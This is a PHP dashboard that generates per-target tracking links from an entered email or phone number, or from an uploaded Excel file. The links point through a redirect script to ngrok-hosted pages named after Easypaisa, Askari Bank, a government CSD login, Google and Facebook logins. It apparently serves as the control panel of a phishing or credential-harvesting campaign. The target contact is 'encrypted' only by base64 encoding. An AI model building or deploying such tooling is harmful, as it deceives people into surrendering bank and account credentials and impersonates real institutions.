<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['group_name'])) {
        // Check if the group name has changed
        if (!isset($_SESSION['group_name']) || $_SESSION['group_name'] !== $_POST['group_name']) {
            // Reset contact when group name changes
            unset($_SESSION['contact']);
        }

        // Update session with new group name
        $_SESSION['group_name'] = $_POST['group_name'];
    }

    if (isset($_POST['contact'])) {
        $_SESSION['contact'] = $_POST['contact'];
    }
}

// Get current values
$groupName = isset($_SESSION['group_name']) ? $_SESSION['group_name'] : '';
$contact = isset($_SESSION['contact']) ? $_SESSION['contact'] : '';

function encryptData($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data)); // URL-safe encoding
}

$base_links = [
    " https://1641-103-137-24-115.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
    "https://1641-103-137-24-115.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
    "https://1641-103-137-24-115.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
    "https://1641-103-137-24-115.ngrok-free.app/google/googlei.php",
    "https://1641-103-137-24-115.ngrok-free.app/real-Estate-Management-System-main/",
    "https://1641-103-137-24-115.ngrok-free.app/facebook/facebook_login.php",
    "https://1641-103-137-24-115.ngrok-free.app/warZoneCommand/index.php",
    "https://1641-103-137-24-115.ngrok-free.app/hackathon/index.html#about",
    "https://1641-103-137-24-115.ngrok-free.app/eshop2",
    "https://1641-103-137-24-115.ngrok-free.app/stylo_website/welcome_stylo.php"
];

if ($contact) {
    $encryptedContact = encryptData($contact);
    
    // **Fix: Clear previous generated links before adding new ones**
    $_SESSION['generated_links'] = [];

    $_SESSION['generated_links'] = array_map(function($link) use ($encryptedContact, $groupName) {
        return "redirect.php?url=" . urlencode($link) . "&contact=" . urlencode($encryptedContact) . "&group=" . urlencode(encryptData($groupName));
    }, $base_links);
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Group Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href=
"https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href=
"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
    <link rel="stylesheet" href=
"https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap">
    <link rel="stylesheet" href="styles.css">


    <style>
        /* Background Styling */
        body {
            background-color: rgb(27, 34, 41);
            background-size: cover;
            backdrop-filter: blur(5px);
            animation: fadeIn 1s ease-in-out;
            color: #f8f9fa;
        }
        
        /* Card Styling */
        .container {
            max-width: 700px;
        }
        .card {
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            background: rgba(40, 48, 58, 0.9);
            transition: transform 0.3s, box-shadow 0.3s;
            color: #f8f9fa;
        }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
        }

        /* Text Styling */
        h2, h3, h4 {
            color: #ffffff;
            font-weight: bold;
            text-shadow: 1px 1px 3px rgba(255, 255, 255, 0.2);
            animation: fadeInUp 0.8s ease-in-out;
        }

        /* Button Effects */
        .btn {
            transition: all 0.3s ease-in-out;
            border: none;
        }
        .btn-primary {
            background-color: #007bff;
        }
        .btn-primary:hover {
            background-color: #0056b3;
            transform: scale(1.05);
        }
        .btn-success {
            background-color: #28a745;
        }
        .btn-success:hover {
            background-color: #218838;
            transform: scale(1.05);
        }
        .btn-warning {
            background-color: #ffc107;
            color: #000;
        }
        .btn-warning:hover {
            background-color: #e0a800;
            transform: scale(1.05);
        }

        /* Input Field Styling */
        .form-control {
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.5);
            color: #f8f9fa;
            transition: 0.3s;
        }
        .form-control::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        .form-control:focus {
            border-color: #007bff;
            box-shadow: 0 0 8px rgba(0, 123, 255, 0.5);
            background: rgba(255, 255, 255, 0.3);
            color: #fff;
        }

        /* List Styling */
        .list-group-item {
            background: rgba(255, 255, 255, 0.1);
            color: #f8f9fa;
            border-color: rgba(255, 255, 255, 0.2);
        }
        .list-group-item a {
            color: #00aaff;
            text-decoration: none;
        }
        .list-group-item a:hover {
            color: #0088cc;
            text-decoration: underline;
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body class="container mt-5">
    
<div class="text-center mb-4">
    <h2><i class="fas fa-user-secret me-2"></i>Group Dashboard</h2>
</div>


    <div class="card p-4 mb-4">
        <form method="POST" id="groupForm">
            <div class="mb-3">
                <label for="group_name" class="form-label fw-bold"><i class="fas fa-edit me-2"></i>Enter Group Name:</label>
                <input type="text" id="group_name" name="group_name" class="form-control" required value="<?php echo htmlspecialchars($groupName); ?>">
            </div>
            <button type="submit" class="btn btn-primary w-100">Save Group</button>
        </form>
    </div>

    <?php if ($groupName): ?>
        <div class="card p-4 mb-4">
            <h3 class="text-center">Group: <?php echo htmlspecialchars($groupName); ?></h3>
            
            <form method="POST" id="contactForm" class="mt-3">
                <div class="mb-3">
                    <label for="contact" class="form-label fw-bold"><i class="fas fa-edit me-2"></i>Enter Email or Phone:</label>
                    <input type="text" id="contact" name="contact" class="form-control" required>
                </div>
                <button type="submit" class="btn btn-success w-100">Generate Links</button>
            </form>
        </div>
        
        <div class="card p-4 mb-4">
            <form method="POST" action="upload_excel.php" enctype="multipart/form-data" id="uploadForm">
                <div class="mb-3">
                    <label for="excel_file" class="form-label fw-bold"><i class="fas fa-folder-open me-2"></i>Upload Excel File:</label>
                    <input type="file" id="excel_file" name="excel_file" class="form-control" accept=".xls,.xlsx" required>
                </div>
                <button type="submit" class="btn btn-warning w-100"> <i class="fas fa-cloud-upload-alt me-2"></i>Upload & Generate Links</button>
            </form>
        </div>
        
        <?php if (isset($_SESSION['generated_links'])): ?>
            <div class="card p-4">
                <h4 class="text-center"><i class="bi-link me-2"></i>Generated Links for Group: <?php echo htmlspecialchars($groupName); ?></h4>
                <ul class="list-group mt-3">
                    <?php foreach ($_SESSION['generated_links'] as $link): ?>
                        <li class="list-group-item text-center">
                            <a href="<?php echo $link; ?>" target="_blank">
                                <?php echo "http://ngrok.com/" . $link; ?>
                            </a>
                        </li>
                    <?php endforeach; ?>
                </ul>
                <?php unset($_SESSION['generated_links']); ?>
            </div>
        <?php endif; ?>
    <?php endif; ?>

</body>
</html>
